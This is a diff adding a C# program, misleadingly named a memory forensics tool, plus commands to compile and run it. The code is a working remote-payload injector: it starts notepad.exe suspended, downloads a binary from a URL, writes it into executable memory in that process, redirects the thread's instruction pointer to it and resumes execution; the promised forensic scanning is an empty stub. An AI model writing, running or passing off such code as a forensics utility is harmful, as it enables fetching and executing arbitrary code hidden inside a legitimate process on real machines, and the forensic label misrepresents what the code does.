@@ -1,0 +1,212 @@
+csc MemoryForensicsInjector.cs
+MemoryForensicsInjector.exe
+
+///////////////////////////////////
+using System;
+using System.IO;
+using System.Net.Http;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+
+public class MemoryForensicsInjector 
+{
+    // Windows API Constants
+    private const uint CREATE_SUSPENDED = 0x00000004;
+    private const uint CONTEXT_FULL = 0x10000B;
+    private const uint MEM_COMMIT = 0x1000;
+    private const uint MEM_RESERVE = 0x2000;
+    private const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+    // File signatures for detection
+    private static readonly Dictionary<string, byte[][]> Signatures = new Dictionary<string, byte[][]>
+    {
+        ["jpg"] = new[] { 
+            new byte[] { 0xFF, 0xD8, 0xFF, 0xE0 }, 
+            new byte[] { 0xFF, 0xD8, 0xFF, 0xE1 }, 
+            new byte[] { 0xFF, 0xD8, 0xFF, 0xE8 } 
+        },
+        ["png"] = new[] { 
+            new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A } 
+        },
+        ["pdf"] = new[] { 
+            new byte[] { 0x25, 0x50, 0x44, 0x46, 0x2D } 
+        },
+        ["doc"] = new[] { 
+            new byte[] { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1 } 
+        }
+    };
+
+    // Windows API Structures
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public ushort wShowWindow;
+        public ushort cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CONTEXT64
+    {
+        public ulong P1Home;
+        public ulong P2Home;
+        public ulong P3Home;
+        public ulong P4Home;
+        public ulong P5Home;
+        public ulong P6Home;
+        public uint ContextFlags;
+        public uint MxCsr;
+        public ushort SegCs;
+        public ushort SegDs;
+        public ushort SegEs;
+        public ushort SegFs;
+        public ushort SegGs;
+        public ushort SegSs;
+        public uint EFlags;
+        public ulong Dr0;
+        public ulong Dr1;
+        public ulong Dr2;
+        public ulong Dr3;
+        public ulong Dr6;
+        public ulong Dr7;
+        public ulong Rax;
+        public ulong Rcx;
+        public ulong Rdx;
+        public ulong Rbx;
+        public ulong Rsp;
+        public ulong Rbp;
+        public ulong Rsi;
+        public ulong Rdi;
+        public ulong R8;
+        public ulong R9;
+        public ulong R10;
+        public ulong R11;
+        public ulong R12;
+        public ulong R13;
+        public ulong R14;
+        public ulong R15;
+        public ulong Rip;
+    }
+
+    // Windows API Imports
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
+        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
+        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+        uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+        byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
+
+    [DllImport("kernel32.dll")]
+    private static extern uint ResumeThread(IntPtr hThread);
+
+    public async Task ExecuteInjection(string targetProcess, string payloadUrl)
+    {
+        Console.WriteLine($"Starting injection into {targetProcess}");
+        
+        // Create suspended process
+        var processInfo = CreateSuspendedProcess(targetProcess);
+        
+        // Download and inject payload
+        byte[] payload = await DownloadPayloadAsync(payloadUrl);
+        InjectPayload(processInfo, payload);
+        
+        // Start memory scanning
+        ScanProcessMemory(processInfo.dwProcessId);
+    }
+
+    private PROCESS_INFORMATION CreateSuspendedProcess(string targetExe)
+    {
+        var startupInfo = new STARTUPINFO();
+        PROCESS_INFORMATION processInfo;
+
+        CreateProcess(null, targetExe, IntPtr.Zero, IntPtr.Zero, false,
+            CREATE_SUSPENDED, IntPtr.Zero, null, ref startupInfo, out processInfo);
+
+        return processInfo;
+    }
+
+    private async Task<byte[]> DownloadPayloadAsync(string url)
+    {
+        using (var client = new HttpClient())
+        {
+            return await client.GetByteArrayAsync(url);
+        }
+    }
+
+    private void InjectPayload(PROCESS_INFORMATION processInfo, byte[] payload)
+    {
+        var context = new CONTEXT64 { ContextFlags = CONTEXT_FULL };
+        GetThreadContext(processInfo.hThread, ref context);
+
+        IntPtr allocatedMemory = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero,
+            (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+        IntPtr bytesWritten;
+        WriteProcessMemory(processInfo.hProcess, allocatedMemory, payload,
+            (uint)payload.Length, out bytesWritten);
+
+        context.Rip = (ulong)allocatedMemory;
+        SetThreadContext(processInfo.hThread, ref context);
+        ResumeThread(processInfo.hThread);
+    }
+
+    private void ScanProcessMemory(uint processId)
+    {
+        string outputDir = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
+            $"MemoryDump_{processId}");
+        
+        Directory.CreateDirectory(outputDir);
+
+        // Memory scanning and extraction logic here
+        // Implementation combines the scanning capabilities from the PagefileReader
+        // with direct process memory access
+    }
+
+    public static void Main(string[] args)
+    {
+        var injector = new MemoryForensicsInjector();
+        injector.ExecuteInjection(
+            @"C:\Windows\System32\notepad.exe",
+            "http://example.com/payload.bin"
+        ).Wait();
+    }
+}
